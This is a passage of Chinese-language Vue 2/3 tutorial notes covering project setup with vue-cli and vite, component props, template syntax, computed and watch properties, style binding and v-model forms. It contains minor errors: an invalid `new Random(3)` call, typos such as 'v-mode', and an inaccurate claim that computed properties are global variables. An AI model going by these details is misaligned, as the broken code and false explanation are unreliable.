# 创建工程

## 0. 安装

```bash
## 查看@vue/cli版本，确保@vue/cli版本在4.5.0以上
vue --version
## 版本过低,进行安装或者升级你的@vue/cli
npm install -g @vue/cli
```

<img src="vue%E7%AC%94%E8%AE%B0.assets/1646013875631-b37e798f-1abf-4bf1-8d5b-b98a80767762.png" alt="img" style="zoom: 60%;" />

## 1. 使用 vue-cli 创建

官方文档：https://cli.vuejs.org/zh/guide/creating-a-project.html#vue-create

vue2.0和vue3.0的区别

1. 创建项目方式：
   + 3.0的安装：vue create 3.0project(项目名) 选择默认选择default方式即可
   + 2.0的安装：vue init webpack(据我所知有五个，这个是我常用的) 2.0project(项目名)
2. 打包方式：
   + 2.0是:   npm run dev
   + 3.0是：npm run serve
3. 工程目录：
   + 3.0 取消掉了config目录、build目录、static目录 ,还有最重要的一点，3.0的安装项目时自动下载node-model  vue.config.js也没了，需要手动添加。

vue create 是vue-cli3.x的初始化方式，目前模板是固定的，模板选项可自由配置，创建出来的是vue-cli3的项目，与cue-cli2项目结构不同，配置方法不同，具体配置方法参考官方文档。

vue init 是vue-cli2.x的初始化方式，可以使用github上面的一些模板来初始化项目，webpack是官方推荐的标准模板名。vue-cli2.x项目向3.x迁移只需要把static目录复制到public目录下，老项目的src目录覆盖3.x的src目录(如果修改了配置，可以查看文档，用cli3的方法进行配置)

**示例:  创建vue3.0**

```bash
## 创建
vue create <3.0project-name>
## 启动
cd <project-name>
npm run serve
```

<img src="vue%E7%AC%94%E8%AE%B0.assets/image-20231120154346809.png" alt="image-20231120154346809" style="zoom:80%;" />

**vue-cli创建vue3项目结构**

```
wms-web
├─ 
├─ babel.config.js
├─ jsconfig.json
├─ package-lock.json
├─ package.json
├─ public
│  ├─ favicon.ico
│  └─ index.html
├─ README.md
├─ src
│  ├─ App.vue
│  ├─ assets
│  │  └─ logo.png
│  ├─ components
│  │  └─ HelloWorld.vue
│  └─ main.js
└─ vue.config.js
```

## 2.使用 vite 创建

官方文档：https://v3.cn.vuejs.org/guide/installation.html#vite

vite官网：https://vitejs.cn

-  新一代前端构建工具。
- 优势如下：
  - 开发环境中，无需打包操作，可快速的冷启动。
  - 轻量快速的热重载（HMR）。
  - 真正的按需编译，不再等待整个应用编译完成
-  **vite.config.js  需要手动添加**

```bash
## 创建工程
npm init vite-app <project-name>
## 进入工程目录
cd <project-name>
## 安装依赖
npm install
## 运行
npm run dev
```

方式2(推荐)

```bash
npm init vite@latest <project-name> -- --template vue
## 进入工程目录
cd <project-name>
## 安装依赖
npm install
## 运行
npm run dev
```

区别:

1. **`npm init vite@latest <project-name> -- --template vue`**

   这个命令使用 Vite 的特定版本（latest）来初始化一个项目，并使用 Vue 模板。通过 `-- --template vue` 部分，你指定了使用 Vue 模板进行项目初始化。这样创建的项目将包括 Vue.js 框架，并且配置为使用 Vite 构建工具。

   ```
   bashCopy code
   npm init vite@latest <project-name> -- --template vue
   ```

2. **`npm init vite-app <project-name>`**

   这个命令使用 Vite 提供的官方应用程序模板来初始化一个项目。这个模板提供了一个完整的 Vue.js 应用程序结构，包括一些默认的配置和示例文件。通过这个命令创建的项目也使用 Vite 构建工具。

   ```
   bashCopy code
   npm init vite-app <project-name>
   ```

**总结：**

- `npm init vite@latest <project-name> -- --template vue` 允许你指定 Vite 的版本并选择 Vue 模板，提供更多的灵活性。
- `npm init vite-app <project-name>` 使用 Vite 提供的官方应用程序模板，提供了一个更快速的创建 Vue 项目的方式，适合那些不需要太多自定义配置的场景。

**vite创建vue3项目结构**

```
wms-web
├─ .gitignore
├─ index.html
├─ package-lock.json
├─ package.json
├─ public
│  └─ favicon.ico
└─ src
   ├─ App.vue
   ├─ assets
   │  └─ logo.png
   ├─ components
   │  └─ HelloWorld.vue
   ├─ index.css
   └─ main.js
```

**支持可视化操作**

```bash
$ vue ui
🚀  Starting GUI...
🌠  Ready on http://localhost:8000
```

默认开启 8000 端口, 也可自定义端口访问:

```bash
$ vue ui -p 3000
```

<img src="vue%E7%AC%94%E8%AE%B0.assets/image-20231120165258643.png" alt="image-20231120165258643" style="zoom: 60%;" />

## 3. 脚手架工程项目结构

图示

<img src="vue%E7%AC%94%E8%AE%B02.0.assets/image-20231120230752338.png" alt="image-20231120230752338" style="zoom:80%;" />

可以用idea或者vscode启动, 个人建议使用vscode

示例:  注意这是vue2.0的项目结构, 跟vue create创建vue3.0有区别

| 项目目录及各目录介绍如下：                                   |
| ------------------------------------------------------------ |
| ![image-20231120162909626](vue%E7%AC%94%E8%AE%B0.assets/image-20231120162909626.png) |

![image-20231120164818206](vue%E7%AC%94%E8%AE%B0.assets/image-20231120164818206.png)

![img](vue%E7%AC%94%E8%AE%B0.assets/1646014014891-d226341c-0ef7-4c94-9b50-6b274d6f2b4b.png)

### 关于不同版本的Vue

1. vue.js与vue.runtime.xxx.js的区别：
   1. vue.js是完整版的Vue，包含：核心功能 + 模板解析器。
   2. vue.runtime.xxx.js是运行版的Vue，只包含：核心功能；没有模板解析器。
2. 因为vue.runtime.xxx.js没有模板解析器，所以不能使用template这个配置项，需要使用render函数接收到的createElement函数去指定具体内容。

### vue.config.js配置文件

1. 使用vue inspect > output.js可以查看到Vue脚手架的默认配置。
2. 使用vue.config.js可以对脚手架进行个性化定制，详情见：https://cli.vuejs.org/zh

## 4. 拉取vue项目运行

第一步：拉取项目代码

```
git clone 项目代码库地址
```

第二步：安装依赖

一般来说，Vue项目依赖的包都在项目的package.json文件中说明，可以根据这个文件来进行安装。在项目根目录下执行如下命令可以安装项目所需的所有包（需安装Node.js）：

```
npm install
```

第三步：运行项目

使用如下命令启动Vue项目：

```
npm run serve
```

## 补充

Vue组件间的参数传递

------

#### 11.1 idea中安装Vue插件

在idea中下载vue插件

![img](vue%E7%AC%94%E8%AE%B0.assets/1646014031373-51ea51b2-4e36-4171-884b-28d88c39db05.png)





在idea中配置，让idea能够操作.vue文件



​	![img](vue%E7%AC%94%E8%AE%B0.assets/1646014047515-c6e14a10-eb82-47cb-889f-d61fd1fe52af.png)



#### 11.2 在项目中创建子组件



创建子组件Content组件



```html
<template>
    <div>
      商品列表...
      {{MyTitle}}
      <button type="button" @click="btnfn('hello java')">点我</button>
    </div>
</template>

<script>
    export default {
        name: "Content.vue",
        props:{
          'MyTitle':{
            type:String,
            required:true,
            default:'XX'
          },
          'btnfn':{
            type:Function
          }
        }
    }
</script>

<style scoped>

</style>
```



#### 11.3 注册子组件



在main.js中注册子组件



```javascript
import Vue from 'vue'
import App from './App.vue'
//引入Content
import Content from './components/Content'


//全局注册组件
Vue.component('MyContent',Content);

new Vue({
  el: '#app',
  render: h => h(App)
})
```



#### 11.4 在App.vue中使用组件并传递参数



```html
<template>
  <div id="app">
		<MyContent :MyTitle="msg"  :btnfn="FCfn" ></MyContent>
  </div>
</template>

<script>
  import MHeader from './components/Header'
export default {
  name: 'app',
  data(){
    return {
      msg:'hello vue!!'
    }
  },
  components:{
    "MHeader":MHeader
  },
  methods:{
    FCfn:function(m){//hello java
      this.msg = m;
    }
  }

}
</script>
<style>

</style>
```



#### 11.5 父传子



通过子组件的props部分，来指明明接收的参数，父组件通过在标签中写明参数的键值对来传递参数。

 

​	props是表示一个组件的参数部分，那么props的写法有两种：

 

​		1）props:[参数列表]

 

​		比如： props:['MyProp1','MyProp2',...]

 

​		2）props:{参数名1:{type:String,required:true,default:'XX'},参数名2:{...}}



![img](vue%E7%AC%94%E8%AE%B0.assets/1646014085293-42216296-d847-4d34-b634-cfe5bdcc2c27.png)

![img](vue%E7%AC%94%E8%AE%B0.assets/1646014101808-4645cc39-799e-4e20-aba4-c52635cf878a.png)





#### 11.6 子传父



子传父的过程十分复杂，下列图解中已经配上了详细的步骤。



![img](vue%E7%AC%94%E8%AE%B0.assets/1646014114070-217acd4b-3f7d-4373-9b70-0c46d929422a.png)



![img](vue%E7%AC%94%E8%AE%B0.assets/1646014123006-822f11ee-c90b-454d-bff5-92bfbc8f82b8.png)

# Vue2

Vue (读音 /vjuː/，类似于 view) 是一套用于构建用户界面的渐进式框架。与其它大型框架不同的是，Vue 被设计为可以自底向上逐层应用。Vue 的核心库只关注视图层，不仅易于上手，还便于与第三方库或既有项目整合。另一方面，当与现代化的工具链以及各种支持类库结合使用时，Vue 也完全能够为复杂的单页应用提供驱动。

## 模板语法({{}})

+ 容器和vue实例是一对一关系
+ 真实开发中只有一个Vue实例，并且会配合着组件一起使用
+ html中的所有动态数据, 都需要在js中定义出来

### 插值语法

1. 功能: 用于解析标签体内容, 不能在标签属性中使用
2. 语法: {{xxx}} ，xxx 会作为js 表达式解析, 直接读取到data中的所有属性

####  简单使用插值表达式获取数据

```html
<div id="app">
	{{title}}
</div>
```

<img src="vue%E7%AC%94%E8%AE%B0.assets/image-20231120155140099.png" style="zoom: 50%;" />

####  在插值表达式中获取数组中的内容

```html
<div id="app">
	{{[1,2,3,4][2]}}
</div>
```

此时，页面上会显示“3”，也就是数组中的第三个元素被获取。

#### 使用插值表达式获取对象中的属性

```html
<div id="app">
	{{ {"name":"xiaoyu","age":20}.age }}
</div>
```

此时，页面上会显示“20”，也就是对象中age属性的值。

#### 使用插值表达式调用Vue中的方法

```html
<div id="app">
		{{ sayHello()}}
</div>
```

此时，页面上会显示“hello vue”，也就是调用了vue对象中的sayHello方法，并展示了方法的返回值。

### 指令语法

1. 功能：用于解析标签（包括：标签属性、标签体内容、绑定事件.....）
2.  语法：xxx 会作为js 表达式解析, 直接读取到data中的所有属性

```vue
<a v-bind:href="school.url.toUpperCase()" x="hello">点我去{{school.name}}学习1</a>
<a :href="school.url" x="hello">点我去{{school.name}}学习2</a>
```

注意：Vue中有很多的指令，且形式都是：v-????

### 综合代码

```html
<!DOCTYPE html>
<html>
	<head>
		<meta charset="UTF-8" />
		<title>模板语法</title>
		<!-- 引入Vue -->
		<script type="text/javascript" src="../js/vue.js"></script>
	</head>
	<body>
		<!-- 准备好一个容器-->
		<div id="app">
			<h1>插值语法</h1>
			<h3>你好，{{name}}</h3>
			<hr/>
			<h1>指令语法</h1>
			<a v-bind:href="school.url.toUpperCase()" x="hello">点我去{{school.name}}学习1</a>
			<a :href="school.url" x="hello">点我去{{school.name}}学习2</a>
		</div>
	</body>

	<script type="text/javascript">
		Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。
		// 创建vue实例
		new Vue({
			el:'#app',  //值通常为css选择器字符串。
			data:{ //data中用于存储数据，数据供el所指定的容器去使用。
				name:'jack',
				school:{
					name:'尚硅谷',
					url:'http://www.atguigu.com',
				}
			}
		})

	</script>
</html>
```

运行结果

<img src="vue%E7%AC%94%E8%AE%B0.assets/image-20231117212512366.png" alt="image-20231117212512366" style="zoom:67%;" />

## Options API(选项式API)

### 属性

#### data属性

```html
<!DOCTYPE html>
<html>
	<head>
		<meta charset="UTF-8" />
		<title>el与data的两种写法</title>
		<!-- 引入Vue -->
		<script type="text/javascript" src="../js/vue.js"></script>
	</head>
	<body>
		<!-- 
			data与el的2种写法
					1.el有2种写法
									(1).new Vue时候配置el属性。
									(2).先创建Vue实例，随后再通过vm.$mount('#root')指定el的值。
					2.data有2种写法
									(1).对象式
									(2).函数式
									如何选择：目前哪种写法都可以，以后学习到组件时，data必须使用函数式，否则会报错。
					3.一个重要的原则：
									由Vue管理的函数，一定不要写箭头函数，一旦写了箭头函数，this就不再是Vue实例了。
		-->
		<!-- 准备好一个容器-->
		<div id="root">
			<h1>你好，{{name}}</h1>
		</div>
	</body>

	<script type="text/javascript">
		Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。

		//el的两种写法
		/* const v = new Vue({
			//el:'#root', //第一种写法
			data:{
				name:'尚硅谷'
			}
		})
		console.log(v)
		v.$mount('#root') //第二种写法 */

		//data的两种写法
		new Vue({
			el:'#root',
			//data的第一种写法：对象式
			/* data:{
				name:'尚硅谷'
			} */

			//data的第二种写法：函数式(推荐)
			data(){
				console.log('@@@',this) //此处的this是Vue实例对象
				return{
					name:'尚硅谷'
				}
			}
		})
	</script>
</html>
```

#### 计算属性

##### 计算属性与方法的区别

###### 方法

```html
<!DOCTYPE html>
<html>
	<head>
		<meta charset="UTF-8" />
		<title>姓名案例_methods实现</title>
		<!-- 引入Vue -->
		<script type="text/javascript" src="../js/vue.js"></script>
	</head>
	<body>
		<!-- 准备好一个容器-->
		<div id="root">
			姓：<input type="text" v-model="firstName"> <br/><br/>
			名：<input type="text" v-model="lastName"> <br/><br/>
			全名：<span>{{fullName()}}</span>
		</div>
	</body>

	<script type="text/javascript">
		Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。

		new Vue({
			el:'#root',
			data:{
				firstName:'张',
				lastName:'三'
			},
			methods: {
				fullName(){
					console.log('@---fullName')
					return this.firstName + '-' + this.lastName
				}
			},
		})
	</script>
</html>
```

###### 计算属性

<font color=red>当所依赖的数据发生变化时, 就会随之调用</font>

```html
<!DOCTYPE html>
<html>
	<head>
		<meta charset="UTF-8" />
		<title>姓名案例_计算属性实现</title>
		<!-- 引入Vue -->
		<script type="text/javascript" src="../js/vue.js"></script>
	</head>
	<body>
		<!-- 
			计算属性：
					1.定义：要用的属性不存在，要通过已有属性计算得来。
					2.原理：底层借助了Objcet.defineproperty方法提供的getter和setter。
					3.get函数什么时候执行？
								(1).初次读取时会执行一次。
								(2).当依赖的数据发生改变时会被再次调用。
					4.优势：与methods实现相比，内部有缓存机制（复用），效率更高，调试方便。
					5.备注：
							1.计算属性最终会出现在vm上，直接读取使用即可。
							2.如果计算属性要被修改，那必须写set函数去响应修改，且set中要引起计算时依赖的数据发生改变。
		 -->
		<!-- 准备好一个容器-->
		<div id="root">
			姓：<input type="text" v-model="firstName"> <br/><br/>
			名：<input type="text" v-model="lastName"> <br/><br/>
			测试：<input type="text" v-model="x"> <br/><br/>
			全名：<span>{{fullName}}</span> <br/><br/>
		</div>
	</body>

	<script type="text/javascript">
		Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。

		const vm = new Vue({
			el:'#root',
			data:{                         // 属性
				firstName:'张',
				lastName:'三',
				x:'你好'
			},
			computed:{                     // 计算属性
                // 定义fullName属性
				fullName:{
					//get有什么作用？当有人读取fullName时，get就会被调用，且返回值就作为fullName的值
					//get什么时候调用？1.初次读取fullName时。2.所依赖的数据发生变化时。
					get(){
						console.log('get被调用了')
						// console.log(this) //此处的this是vm
						return this.firstName + '-' + this.lastName
					},
					//set什么时候调用? 当fullName被修改时。
					set(value){
						console.log('set',value)
						const arr = value.split('-')
						this.firstName = arr[0]
						this.lastName = arr[1]
					}
				}
                /*
                //简写, 确定只用get()就用简写
				fullName(){
					console.log('get被调用了')
					return this.firstName + '-' + this.lastName
				}
				*/
			},
            methods: {  // 方法
				demo(){
				}
			}
            
		})
	</script>
</html>
```

- methods：定义方法，调用方法使用 currentTime1()，需要带括号
- computed：定义计算属性，调用属性使用 currentTime2，不需要带括号

计算属性和data区别在，计算属性定义的一个全局变量，data定义的时候局部变量

注意：methods 和 computed 里不能重名

#### 监视属性

<font color=red>当监视的数据发生变化时, 就会随之调用</font>

##### 基本使用

```html
<!DOCTYPE html>
<html>
	<head>
		<meta charset="UTF-8" />
		<title>天气案例_监视属性_简写</title>
		<!-- 引入Vue -->
		<script type="text/javascript" src="../js/vue.js"></script>
	</head>
	<body>
		<!-- 准备好一个容器-->
		<div id="root">
			<h2>今天天气很{{info}}</h2>
			<button @click="changeWeather">切换天气</button>
		</div>
	</body>

	<script type="text/javascript">
		Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。
		
		const vm = new Vue({
			el:'#root',
			data:{
				isHot:true,
			},
			computed:{
				info(){
					return this.isHot ? '炎热' : '凉爽'
				}
			},
			methods: {
				changeWeather(){
					this.isHot = !this.isHot
				}
			},
			watch:{
				isHot:{
					// immediate:true, //初始化时让handler调用一下
					handler(newValue, oldValue){
						console.log('isHot被修改了',newValue,oldValue)
					}
				}, 
                /*
				//简写, 确定只用handler()就用简写
				isHot(newValue,oldValue){
					console.log('isHot被修改了',newValue,oldValue,this)
				} 
				*/
			}
		})

		//正常写法
		/* vm.$watch('isHot',{
			immediate:true, //初始化时让handler调用一下
			deep:true,//深度监视
			handler(newValue,oldValue){
				console.log('isHot被修改了',newValue,oldValue)
			}
		}) */

		//简写
		/* vm.$watch('isHot',(newValue,oldValue)=>{
			console.log('isHot被修改了',newValue,oldValue,this)
		}) */

	</script>
</html>
```

![image-20231120210638273](vue%E7%AC%94%E8%AE%B0.assets/image-20231120210638273.png)

##### 深度监视

```html
<!DOCTYPE html>
<html>
	<head>
		<meta charset="UTF-8" />
		<title>天气案例_深度监视</title>
		<!-- 引入Vue -->
		<script type="text/javascript" src="../js/vue.js"></script>
	</head>
	<body>
		<!-- 
				深度监视：
						(1).Vue中的watch默认不监测对象内部值的改变（一层）。
						(2).配置deep:true可以监测对象内部值改变（多层）。
				备注：
						(1).Vue自身可以监测对象内部值的改变，但Vue提供的watch默认不可以！
						(2).使用watch时根据数据的具体结构，决定是否采用深度监视。
		 -->
		<!-- 准备好一个容器-->
		<div id="root">
			<h2>今天天气很{{info}}</h2>
			<button @click="changeWeather">切换天气</button>
			<hr/>
			<h3>a的值是:{{numbers.a}}</h3>
			<button @click="numbers.a++">点我让a+1</button>
			<h3>b的值是:{{numbers.b}}</h3>
			<button @click="numbers.b++">点我让b+1</button>
			<button @click="numbers = {a:666,b:888}">彻底替换掉numbers</button>
			{{numbers.c.d.e}}
		</div>
	</body>

	<script type="text/javascript">
		Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。
		
		const vm = new Vue({
			el:'#root',
			data:{
				isHot:true,
				numbers:{
					a:1,
					b:1,
					c:{
						d:{
							e:100
						}
					}
				}
			},
			computed:{
				info(){
					return this.isHot ? '炎热' : '凉爽'
				}
			},
			methods: {
				changeWeather(){
					this.isHot = !this.isHot
				}
			}, //监视
			watch:{
				isHot:{
					// immediate:true, //初始化时让handler调用一下
					//handler什么时候调用？当isHot发生改变时。
					handler(newValue,oldValue){
						console.log('isHot被修改了',newValue,oldValue)
					}
				},
				//监视多级结构中某个属性的变化,要加'xx.yy'
				'numbers.a':{
					handler(){
						console.log('a被改变了')
					}
				}, 
				//监视多级结构中所有属性的变化
				numbers:{
					deep:true,        // 深度监视
					handler(){
						console.log('numbers改变了')
					}
				}
			}
		})
	</script>
</html>
```

### 方法

通过methods定义方法

```html
<!DOCTYPE html>
<html>
	<head>
		<meta charset="UTF-8" />
		<title>姓名案例_methods实现</title>
		<!-- 引入Vue -->
		<script type="text/javascript" src="../js/vue.js"></script>
	</head>
	<body>
		<!-- 准备好一个容器-->
		<div id="root">
			姓：<input type="text" v-model="firstName"> <br/><br/>
			名：<input type="text" v-model="lastName"> <br/><br/>
			全名：<span>{{fullName()}}</span>
		</div>
	</body>

	<script type="text/javascript">
		Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。

		new Vue({
			el:'#root',
			data:{
				firstName:'张',
				lastName:'三'
			},
			methods: {
				fullName(){
					console.log('@---fullName')
					return this.firstName + '-' + this.lastName
				}
			},
		})
	</script>
</html>
```

## 动态数据绑定

<font color=red>可以用于设置元素的任何属性</font>

### 单向数据绑定(:)

1. 语法：
   + v-bind:value ="xxx" 
   + :value="xxx"   (推荐)
2. 特点：数据只能从data 流向页面

#### class绑定

> 动态绑定 class，只需要在 class 前加入 `v-bind` 即可，即 `v-bind:class` 简写为 `:class`。

##### 字符串语法

```html
<div class="basic" :class="mood" @click="changeMood">{{name}}</div> <br/><br/>
```

```html
data: {
 	mood:'normal',
}
```

结果渲染为：

```html
<div class="basic mood"></div>
```

##### 对象语法

一般写法：

```html
<div :class="{ active: isActive }"></div>
```

可以与普通 class 属性共存：

```html
<div class="static"
     :class="{ active: isActive, 'text-danger': hasError }">
</div>
```

```javascript
data: {
  isActive: true,
  hasError: false
}
```

结果渲染为：

```html
<div class="static active"></div>
```

① 绑定的数据对象不必内联定义在模板里(推荐写法)：

```html
<div :class="classObject"></div>
```

```javascript
data: {
  classObject: {
    active: true,
    'text-danger': false
  }
}
```

② 可以绑定一个返回对象的计算属性:

```html
<div v-bind:class="classObject"></div>
```

```javascript
data: {
  isActive: true,
  error: null
},
computed: {
  classObject: function () {
    return {
      active: this.isActive && !this.error,
      'text-danger': this.error && this.error.type === 'fatal'
    }
  }
}
```

##### 数组语法

一般写法：

```html
<div v-bind:class="[activeClass, errorClass]"></div>
```

```javascript
data: {
  activeClass: 'active',
  errorClass: 'text-danger'
}
```

渲染为：

```html
<div class="active text-danger"></div>
```

①  如果想根据条件切换列表中的 class，可以用三元表达式：

```html
<div v-bind:class="[isActive ? activeClass : '', errorClass]"></div>
```

②  当有多个条件 class 时这样写有些繁琐。所以在数组语法中也可以嵌套使用对象语法：

```html
<div v-bind:class="[{ active: isActive }, errorClass]"></div>
```

#### style绑定

> 动态绑定 style，只需要在 style 前加入 `v-bind` 即可，即 `v-bind:style` 简写为 `:style`。

##### 对象语法

一般写法：

```html
<div v-bind:style="{ color: activeColor, fontSize: fontSize + 'px' }"></div>
```

```javascript
data: {
  activeColor: 'red',
  fontSize: 30
}
```

①  直接绑定到一个样式对象通常更好：

```html
<div v-bind:style="styleObject"></div>
```

```javascript
data: {
  styleObject: {
    color: 'red',
    fontSize: '13px'
  }
}
```

同样的，对象语法常常结合返回对象的计算属性使用。

##### 数组语法

一般写法：

```html
<div v-bind:style="[baseStyles, overridingStyles]"></div>
```

##### 自动添加前缀

当 `v-bind:style` 使用需要添加[浏览器引擎前缀](https://developer.mozilla.org/zh-CN/docs/Glossary/Vendor_Prefix)的 CSS 属性时，如 `transform`，Vue.js 会自动侦测并添加相应的前缀。

##### 多重值

从 Vue 2.3.0 起可以为 `style` 绑定中的属性提供一个包含多个值的数组，常用于提供多个带前缀的值，例如：

```html
<div :style="{ display: ['-webkit-box', '-ms-flexbox', 'flex'] }"></div>
```

这样写只会渲染数组中最后一个被浏览器支持的值。在本例中，如果浏览器支持不带浏览器前缀的 flexbox，那么就只会渲染 `display: flex`。

#### 总结:crossed_swords:

1. **`class` 和 `style` 属性：** 用于动态设置元素的类和样式。

   ```vue
   <div :class="{ active: isActive, 'text-danger': hasError }" :style="{ fontSize: fontSize + 'px' }">
       <!-- 内容 -->
   </div>
   ```

2. **表单相关属性：** 用于处理表单元素的值和状态。

   ```vue
   <input type="text" :value="message" @input="updateMessage">
   <input type="checkbox" :checked="isChecked" @change="toggleChecked">
   ```

3. **`disabled` 属性：** 用于禁用或启用按钮等元素。

   ```vue
   <button :disabled="isButtonDisabled">点击我</button>
   ```

4. **其他属性：**<font color = red> 可以用于设置元素的任何属性</font>。

   ```vue
   <img :src="imageUrl" alt="A dynamic image">
   <a :href="url">动态链接</a>
   ```

5. **自定义属性：** 用于设置自定义属性。用于组件通讯

   ```vue
   <div :data-custom="customData">自定义属性</div>
   ```

#### 综合代码

```html
<!DOCTYPE html>
<html>
	<head>
		<meta charset="UTF-8" />
		<title>绑定样式</title>
		<style>
			.basic{
				width: 400px;
				height: 100px;
				border: 1px solid black;
			}
			
			.happy{
				border: 4px solid red;;
				background-color: rgba(255, 255, 0, 0.644);
				background: linear-gradient(30deg,yellow,pink,orange,yellow);
			}
			.sad{
				border: 4px dashed rgb(2, 197, 2);
				background-color: gray;
			}
			.normal{
				background-color: skyblue;
			}

			.atguigu1{
				background-color: yellowgreen;
			}
			.atguigu2{
				font-size: 30px;
				text-shadow:2px 2px 10px red;
			}
			.atguigu3{
				border-radius: 20px;
			}
		</style>
		<script type="text/javascript" src="../js/vue.js"></script>
	</head>
	<body>
		<!-- 
			绑定样式：
					1. class样式
								写法:class="xxx" xxx可以是字符串、对象、数组。
										字符串写法适用于：类名不确定，要动态获取。
										对象写法适用于：要绑定多个样式，个数不确定，名字也不确定。
										数组写法适用于：要绑定多个样式，个数确定，名字也确定，但不确定用不用。
					2. style样式
								:style="{fontSize: xxx}"其中xxx是动态值。
								:style="[a,b]"其中a、b是样式对象。
		-->
		<!-- 准备好一个容器-->
		<div id="root">
			// 方法1
			<!-- 绑定class样式--①字符串写法，适用于：样式的类名不确定，需要动态指定 -->
			<div class="basic" :class="mood" @click="changeMood">{{name}}</div> <br/><br/>

			<!-- 绑定class样式--②数组写法，适用于：要绑定的样式个数不确定、名字也不确定 -->
			<div class="basic" :class="classArr">{{name}}</div> <br/><br/>

			<!-- 绑定class样式--③对象写法，适用于：要绑定的样式个数确定、名字也确定，但要动态决定用不用 -->
			<div class="basic" :class="classObj">{{name}}</div> <br/><br/>

			// 方法2
			<!-- 绑定style样式--对象写法 -->
			<div class="basic" :style="styleObj">{{name}}</div> <br/><br/>
			<!-- 绑定style样式--数组写法 -->
			<div class="basic" :style="styleArr">{{name}}</div>
		</div>
	</body>

	<script type="text/javascript">
		Vue.config.productionTip = false
		
		const vm = new Vue({
			el:'#root',
			data:{
				name:'尚硅谷',
				mood:'normal',
				classArr:['atguigu1','atguigu2','atguigu3'],
				classObj:{
					atguigu1:false,
					atguigu2:false,
				}, 
				// style
				styleObj:{
					fontSize: '40px',
					color:'red',
				},
				styleObj2:{
					backgroundColor:'orange'
				},
				styleArr:[
					{
						fontSize: '40px',
						color:'blue',
					},
					{
						backgroundColor:'gray'
					}
				]
			},
			methods: {
				changeMood(){
					const arr = ['happy','sad','normal']
					const index = Math.floor(new Random(3))
					this.mood = arr[index]
				}
			},
		})
	</script>
	
</html>
```

<img src="vue%E7%AC%94%E8%AE%B0.assets/image-20231120160345054.png" alt="image-20231120160345054" style="zoom: 50%;" />

### 双向数据绑定(v-model)

1. 语法：
   + v-mode:value="xxx" 
   + v-model="xxx"   (推荐)
2. 特点：数据不仅能从data 流向页面，还能从页面流向data
3. v-model的三个修饰符：
   + lazy：失去焦点再收集数据
   + number：输入字符串转为有效的数字
   + trim：输入首尾空格过滤
4. 收集表单数据：
   + 若：<input type="text"/>，则v-model收集的是value值，用户输入的就是value值。 ------ 不设置默认value值。
   + 若：<input type="radio"/>，则v-model收集的是value值，且要给标签配置value值  ------ 设置默认value值。
   + 若：<input type="checkbox"/>
     + 没有配置input的value属性
       + v-model收集的就是布尔值（勾选 or 未勾选，是布尔值）
     + 配置input的value属性:
       + (1)v-model的初始值是非数组，那么收集的就是布尔值（勾选 or 未勾选，是布尔值）
       + (2)v-model的初始值是数组，那么收集的的就是value 

#### 文本框

```html
<!-- 文本框 -->
<input v-model="message1" placeholder="edit me">
<p>Message is: {{ message1 }}</p>

<!-- 文本域 -->
<textarea v-model="message2" placeholder="add multiple lines"></textarea>
<p>Message is: {{ message2 }}</p>
```

```javascript
new Vue({
  el: '#app',
  data: {
    message1: '',
    message2: ''
  }
})
```

<img src="https://cdn.nlark.com/yuque/0/2020/gif/2213540/1607593484728-d57b6c81-0b00-43ae-bf7e-47ecfe63fab2.gif#align=left&display=inline&height=186&originHeight=186&originWidth=250&size=45262&status=done&style=none&width=250" alt="GIF.gif" style="zoom:80%;" />

#### 单选框

对于单选框的选项，`v-model` 绑定的值通常是静态字符串：

```html
<!-- 单选框 -->
<div id="radio-group">
  <input type="radio" id="one" value="One" v-model="picked">
  <label for="one">One</label>
  <br>
  <input type="radio" id="two" value="Two" v-model="picked">
  <label for="two">Two</label>
  <br>
  <span>Picked: {{ picked }}</span>
</div>
```

```javascript
new Vue({
  el: '#app',
  data: {
    picked: ''
  }
})
```

当选中第一个按钮时，`vm.picked === One`，当选中第二个按钮时，`vm.picked === Twe`![GIF.gif](https://cdn.nlark.com/yuque/0/2020/gif/2213540/1607593565659-746afcb9-618b-43fd-8aed-d0c645036a8e.gif#align=left&display=inline&height=80&originHeight=80&originWidth=157&size=3227&status=done&style=none&width=157)

#### 复选框

对于复选框的选项，`v-model` 绑定的值通常是静态字符串，也可以是布尔值：

```html
<!-- 单个复选框，绑定到布尔值 -->
<input type="checkbox" id="checkbox" v-model="checked">
<label for="checkbox">checked: {{ checked }}</label>

<!-- 多个复选框，绑定到同一个数组 -->
<div id='checkbox-group'>
  <input type="checkbox" id="jack" value="Jack" v-model="checkedNames">
  <label for="jack">Jack</label>
  <input type="checkbox" id="john" value="John" v-model="checkedNames">
  <label for="john">John</label>
  <input type="checkbox" id="mike" value="Mike" v-model="checkedNames">
  <label for="mike">Mike</label>
  <br>
  <span>Checked names: {{ checkedNames }}</span>
</div>
```

```javascript
new Vue({
  el: '#app',
  data: {
    checked: false,
    checkedNames: []
  }
})
```

![GIF](vue%E7%AC%94%E8%AE%B02.0.assets/GIF.gif)

##### true-value 和 false-value

```html
<input
  type="checkbox"
  v-model="toggle"
  true-value="yes"
  false-value="no"
>
```

```javascript
// 当选中时
vm.toggle === 'yes'
// 当没有选中时
vm.toggle === 'no'
```

![GIF (1)](vue%E7%AC%94%E8%AE%B02.0.assets/GIF%20(1).gif)
这里的 `true-value` 和 `false-value` 特性并不会影响输入控件的 `value` 特性，因为浏览器在提交表单时并不会包含未被选中的复选框。如果要确保表单中这两个值中的一个能够被提交，(比如“yes”或“no”)，请换用单选按钮。

#### 选择框

对于选择框的选项，`v-model` 绑定的值通常是静态字符串：

```html
<!-- 选择框: 单选 -->
<div id="select-option">
  <select v-model="selected1">
    <option disabled value="">请选择</option>
    <option>A</option>
    <option>B</option>
    <option>C</option>
  </select>
  <span>Selected: {{ selected1 }}</span>
</div>

<!-- 选择框: 多选 -->
<div id="select-option-multiple">
  <select v-model="selected2" multiple style="width: 50px;">
    <option>A</option>
    <option>B</option>
    <option>C</option>
  </select>
  <br>
  <span>Selected: {{ selected2 }}</span>
</div>

<!-- 选择框: 用 v-for 渲染的动态选项 -->
<select v-model="selected3">
  <option v-for="option in options" :value="option.value">
    {{ option.text }}
  </option>
</select>
<span>Selected: {{ selected3 }}</span>
```

```javascript
new Vue({
  el: '#app',
  data: {
    selected1: '',
    selected2: [],
    selected3: 'A',
